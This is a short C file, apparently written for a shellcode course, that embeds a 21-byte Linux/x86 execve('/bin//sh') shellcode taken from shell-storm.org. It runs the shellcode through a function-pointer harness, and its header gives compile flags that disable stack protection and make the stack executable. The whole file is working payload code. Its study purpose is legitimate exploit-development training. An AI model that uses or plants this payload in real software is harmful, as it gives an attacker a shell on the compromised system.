/*
Filename:      shellcode-orig.c
Author:        Nicolas Barrière
Student ID:    SLAE - 1398
Created Date:  05.12.2018
Note:          x86 code but compiled on x64
Source:        http://shell-storm.org/shellcode/files/shellcode-841.php
Information:   Linux/x86 - tiny_execve_sh_shellcode - 21 bytes
Compiler:      gcc -m32 -ggdb -fno-stack-protector -z execstack shellcode-orig.c -o shellcode-orig
*/

#include<stdio.h>
#include<string.h>

unsigned char code [] = \
"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f"
"\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd"
"\x80";

main()
{
  printf("Shellcode Lenght: %d\n", strlen(code));
  int (*ret)() = (int(*)())code;
  ret();
}
